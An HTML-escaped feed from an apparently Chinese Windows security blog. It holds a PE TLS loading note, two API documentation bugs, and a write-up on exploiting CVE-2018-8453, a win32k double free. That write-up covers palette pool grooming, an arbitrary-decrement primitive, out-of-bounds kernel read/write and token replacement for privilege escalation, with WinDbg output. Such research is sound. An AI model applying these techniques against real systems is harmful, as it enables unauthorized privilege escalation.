    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SizeOfZeroFill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Characteristics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reserved0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Alignment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Reserved1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DUMMYSTRUCTNAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DUMMYUNIONNAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_TLS_DIRECTORY64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在装载 pe 的时候，ntdll 使用 LdrpAllocateTlsEntry 为每个 image 分配 tls 表项，具体来说就是找到 image 的 tls 表，然后在内存中分配一个 buffer 将表中的数据拷贝到 buffer 中，并调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LdrpAcquireTlsIndex&lt;/code&gt; 为这个 tls entry 分配一个 index（也就是 tls index），最后将这块 buffer 加入一个双向链表 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LdrpTlsList&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;在分配完 index 后，对于 LdrpTlsList 中的每个 tls entry，ntdll 将其包含的静态 tls data 写入 teb 中的 ThreadLocalStoragePointer 指向的数组中。&lt;/p&gt;

&lt;p&gt;如果反汇编一段读取静态 tls 数据的代码，我们就可以看到，程序通过 tlsindex 在 ThreadLocalStoragePointer 中读取了数据。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt; mov eax,108                            
 mov eax,eax                            
 mov ecx,dword ptr ds:[&amp;lt;_tls_index&amp;gt;]    
 mov rdx,qword ptr gs:[58]           
 add rax,qword ptr ds:[rdx+rcx*8]       
 mov r9d,1                              
 xor r8d,r8d                            
 mov rdx,rax               
 xor ecx,ecx                            
 call qword ptr ds:[&amp;lt;&amp;amp;MessageBoxA&amp;gt;]     

&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;最近几个月一直没有写博客，这篇文章写得也很简略，一方面因为脑子里确实没什么东西，另一方面也因为工作换了，精力少了很多，我也不确定这个系列是否能写完。虽然本文技术上的内容没有写多少，但是还有其他话想说正。如我去年所写的，“事情的发展总是凡人难以预料的，通过渗透入门安全的时候我无论如何也不会想到三年后已经早已不再接触渗透”，如今这似乎像预言一样的东西确实兑现了。尽管现在做的东西已经不属于安全行业了，但是我仍然认为它跟安全有着联系，我也仍然认为我是一个搞安全的。&lt;/p&gt;

&lt;p&gt;最后仿写一段本人刚刚接触二进制时看到的一篇大佬的文章末尾写的话，我觉得此时此刻恰如彼时彼刻：&lt;/p&gt;

&lt;p&gt;写这篇文章时笔者不禁想起了几年前刚成为黑客只是想绕过 360 做免杀的自己，如今几年过去了以笔者的能力自认为做到完美的免杀变成易如反掌的事情了，但是笔者却成为了一个送外卖的外卖小哥. 安全路漫漫, 要学的东西还有很多。&lt;/p&gt;</content><author><name></name></author><category term="windows" /><summary type="html">我接触 Windows 最开始看的两本书是《PE 权威指南》和《Windows 核心编程》，学这两本书的目的也很简单：实现内存加载。我们知道，要实现内存加载，最重要的是处理 PE 中的三个表：导入表，iat 和重定位表。然而跟 pe 装载有关系的表却不仅仅只有这三个，那么剩下的表都有着怎样的内容？在 PE 的装在过程中发挥了什么样的作用？</summary></entry><entry><title type="html">What It Says Is Not What It eXecute</title><link href="https://citrusice.github.io/posts/what-it-says-is-not-what-it-execute/" rel="alternate" type="text/html" title="What It Says Is Not What It eXecute" /><published>2023-02-24T16:08:51+08:00</published><updated>2023-02-24T16:08:51+08:00</updated><id>https://citrusice.github.io/posts/what-it-says-is-not-what-it-execute</id><content type="html" xml:base="https://citrusice.github.io/posts/what-it-says-is-not-what-it-execute/">&lt;p&gt;对于每个程序员来说，编程时最依赖也最为可靠的便是官方给的文档以及 sdk 中的种种信息。然而即便是官网文档，其内容也并非完全正确。本文将分享我最近调试的两个bug。&lt;/p&gt;

&lt;h1 id=&quot;enumdesktops&quot;&gt;EnumDesktops&lt;/h1&gt;

&lt;p&gt;这是一个枚举指定 window station 上所有 desktop 的函数&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;EnumDesktopsA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optional&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HWINSTA&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;hwinsta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;DESKTOPENUMPROCA&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpEnumFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;LPARAM&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;lParam&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;关于第一个参数，文档写的是如果是 NULL 则当前的 window station 会被使用&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[in, optional] hwinsta&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;A handle to the window station whose desktops are to be enumerated. This handle is returned by the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-createwindowstationa&quot;&gt;CreateWindowStation&lt;/a&gt;, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getprocesswindowstation&quot;&gt;GetProcessWindowStation&lt;/a&gt;, or &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-openwindowstationa&quot;&gt;OpenWindowStation&lt;/a&gt; function, and must have the WINSTA_ENUMDESKTOPS access right. For more information, see &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/desktop/winstation/window-station-security-and-access-rights&quot;&gt;Window Station Security and Access Rights&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If this parameter is NULL, the current window station is used.&lt;/p&gt;

&lt;p&gt;实际上当 window station 为 NULL 时则会在回调中返回 winstation 的列表，也就是说此时该函数并不会返回desktop的列表，而是返回所有window station的列表。&lt;/p&gt;

&lt;p&gt;调用链：
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user32!InternalEnumObjects&lt;/code&gt; &amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtUserBuildNameList&lt;/code&gt; &amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_BuildNameList&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;根据代码可以看到，当给 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_BuildNameList&lt;/code&gt; 传入的 pwinsta 为 NULL 时，该函数返回的是 winstation 的列表&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;cm&quot;&gt;/*
     * If we're enumerating windowstations, pwinsta is NULL.  Otherwise,
     * we're enumerating desktops.
     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwinsta&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pobj&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;grpWinStaList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;amDesired&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WINSTA_ENUMERATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pGenericMapping&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WinStaMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;iNext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FIELD_OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WINDOWSTATION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rpwinstaNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pobj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pwinsta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rpdeskList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;amDesired&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DESKTOP_ENUMERATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pGenericMapping&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DesktopMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;iNext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FIELD_OFFSET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DESKTOP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rpdeskNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;zwmapviewofsection&quot;&gt;ZwMapViewOfSection&lt;/h1&gt;

&lt;p&gt;这倒不是 msdn 上文档出错，而是我不知道从哪搞过来的一份 ntdll 声明出错了。&lt;/p&gt;

&lt;p&gt;MSDN 上函数的声明&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;NTSYSAPI&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ZwMapViewOfSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;SectionHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;ProcessHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BaseAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;ULONG_PTR&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;ZeroBits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;SIZE_T&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;CommitSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optional&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PLARGE_INTEGER&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;SectionOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;PSIZE_T&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;ViewSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;SECTION_INHERIT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InheritDisposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;AllocationType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;Win32Protect&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;头文件中的声明&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;NTSYSAPI&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;NTAPI&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ZwMapViewOfSection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SectionHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ProcessHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OUT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BaseAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZeroBits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommitSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OUT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PLARGE_INTEGER&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SectionOffset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OPTIONAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OUT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ViewSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SECTION_INHERIT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InheritDisposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AllocationType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Protect&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到 CommitSize 和 ZeroBits 的大小在 x64 的情况下是不对的，ULONG 是 4 字节而 ULONG_PTR 和 SIZE_T 都是 8 字节。这就导致了在传参的时候，原来栈上杂乱的数据会影响到这两个参数的高位，导致传参不正确。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;之前读了一篇关于代码分析的论文，名字叫《What You See Is Not What You eXecute》，所以我就也模仿了一下起了这么一个标题。&lt;/p&gt;</content><author><name></name></author><category term="debugging" /><summary type="html">对于每个程序员来说，编程时最依赖也最为可靠的便是官方给的文档以及 sdk 中的种种信息。然而即便是官网文档，其内容也并非完全正确。本文将分享我最近调试的两个bug。</summary></entry><entry><title type="html">CVE-2018-8453 利用（下）</title><link href="https://citrusice.github.io/posts/cve-2018-8453-exploit-2/" rel="alternate" type="text/html" title="CVE-2018-8453 利用（下）" /><published>2023-01-11T15:11:34+08:00</published><updated>2023-01-11T15:11:34+08:00</updated><id>https://citrusice.github.io/posts/cve-2018-8453-exploit-2</id><content type="html" xml:base="https://citrusice.github.io/posts/cve-2018-8453-exploit-2/">&lt;p&gt;上一篇文章中我们在探索漏洞利用的过程中意外发现了一个新的方法，即一个任意地址减一的原语，本文将延续这个方法，通过任意地址减一这个原语实现漏洞的利用。&lt;/p&gt;

&lt;p&gt;本文利用环境依然为 win10 x64 1703&lt;/p&gt;

&lt;p&gt;参考：&lt;a href=&quot;https://ti.qianxin.com/blog/articles/cve-2018-8453-win32k-elevation-of-privilege-vulnerability-targeting-the-middle-east/&quot;&gt;CVE-2018-8453：针对中东地区的Windows内核提权漏洞利用分析&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;首先回顾一下上次的流程。这个漏洞是一个 double free 漏洞，在第一次释放后我们通过 NtGdiSetLinkedUFIs 去在原始被释放的位置分配了一块新的内存，而在第二次释放前，win32k 对 sbtrack 中的字段有 unlock 的操作，由于 sbrack 的内存现在是我们可以控制的，所以此时我们有了一个任意地址减一的原语。&lt;/p&gt;

&lt;p&gt;那么我们用这个任意地址减一的原语去干什么？首先想到的那就是通过两个相邻的 palette，修改前一个 palette 的 cEntries 为 0 的高位（减一后溢出变为 0xff），实现增大 cEntries 的效果，然后覆盖后一个 palette 的 apalColor 实现任意读写。&lt;/p&gt;

&lt;p&gt;如果要这么实现，那么我们需要进一步解决两个问题，第一要知道这两个 palette 的地址，第二是要让这两个 palette 相邻（或者比较足够近）。&lt;/p&gt;

&lt;p&gt;首先还是通过窗口 lpszMenuName 预测下一次分配一个页时的地址，因为这个预测方法需要 palette 必须大于一页（large pool 分配机制），所以相邻的 palette 一定在第二页中。因此我们设计第一个 palette 大小为 0x1b00。&lt;strong&gt;在 large pool 分配后，系统会在分配的块后面加一个 frag chunk，然后将多余的块作为待分配的 poolchunk 管理。&lt;/strong&gt; 因此第二个 palette 的大小便是 0x4e0。为了防止还有其他的待分配的 0x4e0 的块，这里我们可以分配大量的 palette，然后通过 Manager palette 改写后面 palette cEntries 来确定哪个是真正分配在 Manager 后面的块。这样就实现了两个并排的 palette，并且我们知道他们俩个的地址。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; ??MgrAddr
unsigned int64 0xffffa088`c2557000
0: kd&amp;gt; !pool 0xffffa088`c2557000
Pool page ffffa088c2557000 region is Paged session pool
ffffa088c2557000 is not a valid large pool allocation, checking large session pool...
*ffffa088c2557000 : large page allocation, tag is Gh08, size is 0x1b00 bytes
		Pooltag Gh08 : GDITAG_HMGR_PAL_TYPE, Binary : win32k.sys
0: kd&amp;gt; !pool 0xffffa088`c2557000+1b00+20
Pool page ffffa088c2558b20 region is Paged session pool
ffffa088c2558000 is not a valid large pool allocation, checking large session pool...
 ffffa088c2558b00 size:   20 previous size:    0  (Allocated)  Frag
*ffffa088c2558b20 size:  4e0 previous size:   20  (Allocated) *Gh08
		Pooltag Gh08 : GDITAG_HMGR_PAL_TYPE, Binary : win32k.sys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同样我们继续使用 NtGdiSetLinkedUFIs 在 sbtrack 被释放后分配内存，在原始思路中，文章作者使用了 bitmap 来占位刚被释放的 sbtrack，这是因为作者的利用环境为 1709，此时 bitmap 已经开启了 type isolation，数据与 bitmap 头做了分离，因此变相实现了 NtGdiSetLinkedUFIs 的效果。&lt;/p&gt;

&lt;p&gt;虽然使用任意地址减一的方法不需要 sbtrack 的那个 chunk 与之后的 chunk 合并，但是可能是有由于 sbtrack 的 chunk size 太小，导致利用不稳定（之后重新分配的时候经常分配不到 sbtrack 的那个块），因此还是将 chunk 合并为大块（大块数量少）。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; !dppal 0xffffa088`c1db7000
EPALOBJ structure at 0xffffa088c1db7000:
--------------------------------------------------
FLONG      flPal         0x501
ULONG      cEntries      0xffff069c
ULONG      ulTime        0x2082
HDC        hdcHead       0x0000000000000000
HDEVPPAL   hSelected     0x0000000000000000
ULONG      cRefhpal      0x0
ULONG      cRefRegular   0x0
PTRANSLATE ptransFore    0x0000000000000000
PTRANSLATE ptransCurrent 0x0000000000000000
PTRANSLATE ptransOld     0x0000000000000000
PPALETTE   ppalColor     0xffffa088c1db7088
PAL_ULONG  apalColor     0x0000000000000000
--------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将 cEntries 高位减一后变为 0xffff，此时 palette 就可以实现越界读写了，然后再改写后面的 palette。&lt;/p&gt;

&lt;p&gt;写到这才想起来 0xffff0000 是一个很大的数，可以越界读写 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xffff0000*4&lt;/code&gt;（约3gb） 的内存空间，实际上我们根本不需要让两个 palette 并排放置，只要多申请几个 palette 然后确定两个 palette 之间的距离在这个范围内就可以了。&lt;/p&gt;

&lt;p&gt;之后的流程就是一模一样了，从内核中删除 dc object 的 handle entry 防止二次释放，然后替换进程 token 提权。&lt;/p&gt;

&lt;hr /&gt;

